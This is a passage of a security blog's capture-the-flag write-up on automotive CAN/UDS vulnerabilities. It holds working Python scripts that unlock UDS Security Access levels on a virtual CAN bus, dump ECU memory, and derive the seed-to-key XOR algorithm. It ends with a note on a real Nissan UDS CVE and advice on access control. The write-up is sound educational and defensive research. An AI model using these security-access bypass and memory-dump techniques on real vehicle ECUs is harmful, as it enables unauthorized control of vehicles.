+        frame_r = p.recv(<span class="hljs-number">16</span>)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:
+            <span class="hljs-keyword">break</span>
+    
+    print(<span class="hljs-string">&quot;Security access level 3 unlock!&quot;</span>)</code></pre>
+<p><img src="image24.png" srcset="/img/loading.gif" alt="image24.png"></p>
+<p>Additionally, the calculated key value must be transmitted within a very short time after confirming the seed value. Therefore, it is recommended to write code like the one above (though you can do it manually if you are fast enough).</p>
+<h3 id="3-6-Security-Access-Level-1"><a href="#3-6-Security-Access-Level-1" class="headerlink" title="3.6. Security Access Level 1"></a>3.6. Security Access Level 1</h3><p><img src="image25.png" srcset="/img/loading.gif" alt="image25.png"></p>
+<p>This challenge requires identifying the Security Access Level 1 cryptographic algorithm by reading the memory in the <code>0x1A000</code> range. The flag is the key value for the seed <code>0x7D0E1A5C</code>. It is known that the seed and key lengths for Level 1 are 4 bytes.</p>
+<p>Oddly, in this UDS Challenge, Level 1 is placed after Level 3.</p>
+<pre><code class="hljs python"><span class="hljs-comment"># read memory</span>
+
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> struct
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>
+    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>
+    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)
+    <span class="hljs-keyword">return</span> can_id, dlc, data
+
+recvdata = <span class="hljs-string">&quot;&quot;</span>
+
+<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:
+    can_id_filter = <span class="hljs-number">0x7E8</span>
+    can_mask_filter = <span class="hljs-number">0xFFF</span>
+    can_filter = struct.pack(<span class="hljs-string">&quot;=II&quot;</span>, can_id_filter, can_mask_filter)
+    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_FILTER, can_filter)
+    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_RECV_OWN_MSGS, <span class="hljs-number">0</span>)
+
+    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))
+
+    <span class="hljs-keyword">for</span> hex_value <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x1A000</span>, <span class="hljs-number">0x1B000</span>, <span class="hljs-number">0xFF</span>):
+        candata = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + hex_value.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>
+        
+        data1 = <span class="hljs-string">b&quot;\x02\x10\x02\x00\x00\x00\x00\x00&quot;</span>
+        frame1 = build_can_frame(<span class="hljs-number">0x7DF</span>, data1)
+        p.send(frame1)
+        
+        frame_r1 = p.recv(<span class="hljs-number">16</span>)
+        
+        frame2 = build_can_frame(<span class="hljs-number">0x7DF</span>, candata)
+        p.send(frame2)
+        
+        frame_r2 = p.recv(<span class="hljs-number">16</span>)
+        can_id2, dlc2, data_r2 = dissect_can_frame(frame_r2)
+        
+        recvdata += data_r2.hex()[<span class="hljs-number">6</span>:]
+        
+        data3 = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>
+        frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)
+        p.send(frame3)
+        
+        temp = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">while</span> temp &lt; <span class="hljs-number">36</span>:
+            frame_r_loop = p.recv(<span class="hljs-number">16</span>)
+            can_id_loop, dlc_loop, data_loop = dissect_can_frame(frame_r_loop)
+            
+            tempdata = data_loop.hex()[<span class="hljs-number">2</span>:]
+            
+            <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:
+                recvdata += tempdata
+            temp = temp + <span class="hljs-number">1</span>
+
+print(<span class="hljs-string">f&quot;recv data: <span class="hljs-subst">{recvdata}</span>&quot;</span>)</code></pre>
+<p>First, write the code to perform a read operation on the memory in the <code>0x1A000</code> region.</p>
+<p><img src="image26.png" srcset="/img/loading.gif" alt="image26.png"></p>
+<p>Previously, execute the code that authenticates Level 3 first to pass the Level 3 authentication.</p>
+<p>After that, if you execute the memory read code you just wrote, you can confirm that a 4-byte value exists twice. You can confirm that this value changes every time a seed value is generated through a security access Level 1 request.</p>
+<pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x983cb51b</span> ^ <span class="hljs-number">0xcd051f0c</span>)
+<span class="hljs-string">&apos;0x5539aa17&apos;</span>
+<span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0xddee9870</span> ^ <span class="hljs-number">0x88d73267</span>)
+<span class="hljs-string">&apos;0x5539aa17&apos;</span>
+<span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x4a4499ad</span> ^ <span class="hljs-number">0x1f7d33ba</span>)
+<span class="hljs-string">&apos;0x5539aa17&apos;</span></code></pre>
+<p>It can be seen that performing an XOR operation on those values results in a fixed value of <code>0x5539aa17</code>.</p>
+<p>Through this, we can know that a key value calculated with the seed value exists in memory. And we can also know that the calculation algorithm is <code>seed ^ 0x5539aa17</code>.</p>
+<p><img src="image28.png" srcset="/img/loading.gif" alt="image27.png"></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+<span class="hljs-comment"># 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>
+cansend vcan0 7E0<span class="hljs-comment">#021003</span>
+
+<span class="hljs-comment"># 02(PCI:len) 27(SID:SecurityAccess) 01(Level)</span>
+cansend vcan0 7E0<span class="hljs-comment">#022701</span>
+
+<span class="hljs-comment"># 06(PCI:len) 27(SID:SecurityAccess) 02(Level+1) KEYSKEYS</span>
+cansend vcan0 7E0<span class="hljs-comment">#062702KEYSKEYS</span></code></pre>
+<p>When attempting Security Access Level 1 authentication using the discovered encryption algorithm, it can be seen that it succeeds, confirming the RSID (<code>67</code>).</p>
+<pre><code class="hljs python"><span class="hljs-comment"># security access level 1 pass</span>
+
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> struct
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>
+    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>
+    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)
+    <span class="hljs-keyword">return</span> can_id, data
+
+<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:
+    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))
+    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>
+    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)
+    p.send(frame1)
+
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        frame_r = p.recv(<span class="hljs-number">16</span>)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:
+            <span class="hljs-keyword">continue</span>
+        <span class="hljs-keyword">break</span>
+
+    data2 = <span class="hljs-string">b&quot;\x02\x27\x01\x00\x00\x00\x00\x00&quot;</span>
+    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)
+    p.send(frame2)
+
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        frame_r = p.recv(<span class="hljs-number">16</span>)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:
+            <span class="hljs-keyword">continue</span>
+        <span class="hljs-keyword">break</span>
+
+    seed_bytes = msg_data[<span class="hljs-number">3</span>:<span class="hljs-number">7</span>]
+    seed_int = int.from_bytes(seed_bytes, <span class="hljs-string">&apos;big&apos;</span>)
+    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)
+
+    key_int = seed_int ^ <span class="hljs-number">0x5539AA17</span>
+    print(<span class="hljs-string">f&quot;Key: <span class="hljs-subst">{key_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)
+
+    key_bytes = key_int.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&apos;big&apos;</span>)
+    data3 = <span class="hljs-string">b&quot;\x06\x27\x02&quot;</span> + key_bytes
+    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)
+    p.send(frame3)
+
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        frame_r = p.recv(<span class="hljs-number">16</span>)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:
+            <span class="hljs-keyword">continue</span>
+        <span class="hljs-keyword">break</span>
+
+    print(<span class="hljs-string">&quot;Security access level 1 unlock!&quot;</span>)</code></pre>
+<p><img src="image28.png" srcset="/img/loading.gif" alt="image28.png"></p>
+<p>The code to unlock Security Access Level 1 can also be written.</p>
+<p><img src="image29.jpg" srcset="/img/loading.gif" alt="image29.jpg"></p>
+<h2 id="4-CVEs-occurring-due-to-UDS-commands"><a href="#4-CVEs-occurring-due-to-UDS-commands" class="headerlink" title="4. CVEs occurring due to UDS commands"></a>4. CVEs occurring due to UDS commands</h2><p><img src="image30.jpg" srcset="/img/loading.gif" alt="image30.jpg"></p>
+<p>Security vulnerabilities can occur with UDS commands learned through the BlockHarbor CTF, and there are actual cases where CVEs are issued. A prime example is <a target="_blank" rel="external nofollow noopener noreferrer" href="https://nvd.nist.gov/vuln/detail/CVE-2024-6347">CVE-2024-6347</a>, which occurred in the Nissan Altima.</p>
+<p>CVE-2024-6347 is a case where a DoS vulnerability occurred via UDS commands. The DoS vulnerability was caused by unauthorized access to the ECU programming session in the blind spot detection sensor ECU firmware.</p>
+<p>Furthermore, vulnerabilities through CAN/UDS can include Information Leakage through Read Data By Identifier Request (<code>22</code>) and various Diagnostic Requests (<code>19</code>, etc.), and the acquisition of ECU and in-vehicle privileges through Security Access (<code>27</code>) bypass. In particular, if validation for Read Memory By Address Request (<code>23</code>) is inadequate, the firmware can be leaked through internal memory access.</p>
+<p>Therefore, rigorous validation of CAN/UDS messages and access control for security access can be said to be the most fundamental elements in vehicle security.</p>
+<p>Next time, I will return with a different embedded topic! Thank you! &#x1F44B;&#x1F3FB;</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                <div class="post-meta mr-3">
+                  <i class="iconfont icon-category"></i>
+                  
+                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
+                  
+                </div>
+                
+                
+                <div class="post-meta">
+                  <i class="iconfont icon-tags"></i>
+                  
+                  <a class="hover-with-bg" href="/tags/CAN/">CAN</a>
+                  
+                  <a class="hover-with-bg" href="/tags/newp1ayer48/">newp1ayer48</a>
+                  
+                  <a class="hover-with-bg" href="/tags/UDS/">UDS</a>
+                  
+                  <a class="hover-with-bg" href="/tags/VSEC/">VSEC</a>
+                  
+                  <a class="hover-with-bg" href="/tags/automotive/">automotive</a>
+                  
+                  <a class="hover-with-bg" href="/tags/blockharbor/">blockharbor</a>
+                  
+                  <a class="hover-with-bg" href="/tags/car/">car</a>
+                  
+                  <a class="hover-with-bg" href="/tags/vehicle/">vehicle</a>
+                  
+                </div>
+                
+              </div>
+
+              <div class="post-metas mb-3">
+                <a class="hover-with-bg" style="display: flex;" href="/author">
+                  <div class="link-avatar-page">
+                    <img src="/img/profile_newp1ayer48.jpg" srcset="/img/loading.gif" alt="newp1ayer48">
+                  </div>
+
+                  <div class="link-text">
+                    <div class="link-title">newp1ayer48</div>
+                  </div>
+                </a>
+                <div class="link-text">
+                  <div class="link-more">
+                    <a href="/tags/newp1ayer48">
+                      Read more
+                      <i class="iconfont icon-arrowdown"></i>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <hr>
+              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              
+              <!--  -->
+              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
+              
+              
+              
+              <div class="post-prevnext row">
+                <article class="post-prev col-6">
+                  
+                  
+                  <a href="/2025/11/20/newp1ayer48/can/kr/">
+                    <i class="iconfont icon-arrowleft"></i>
+                    <span class="hidden-mobile">[Research] BlockHarbor CTF와 CVE로 알아보는 CAN / UDS 취약점 (KR)</span>
+                    <span class="visible-mobile">Previous</span>
+                  </a>
+                  
+                </article>
+                <article class="post-next col-6">
+                  
+                  
+                  <a href="/2025/11/19/poosic/cve-2025-10456/">
+                    <span class="hidden-mobile">[하루한줄] CVE-2025-10456 : Zephyr RTOS의 BLE의 검증 미흡으로 인한 DoS</span>
+                    <span class="visible-mobile">Next</span>
+                    <i class="iconfont icon-arrowright"></i>
+                  </a>
+                  
+                </article>
+              </div>
+              
+            </div>
+            
+            <!-- Embed Section -->
+            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
+              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
+            </div>            
+
+            
+            <!-- Comments -->
+            <article class="comments" id="comments">
+              
+              
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/';
+        this.page.identifier = '/2025/11/20/newp1ayer48/can/en/';
+      };
+      function loadDisqus() {
+        (function () {
+          var d = document,
+            s = d.createElement('script');
+          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      }
+      waitElementVisible('disqus_thread', loadDisqus);
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+            </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+      <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/lazyload.js"></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+  <script src="/js/clipboard-use.js"></script>
+
+
+
+
+
+
+
+  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[Research] Understanding CAN / UDS Vulnerabilities through BlockHarbor CTF and CVEs (EN)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-177243668-2', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-177243668-2');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
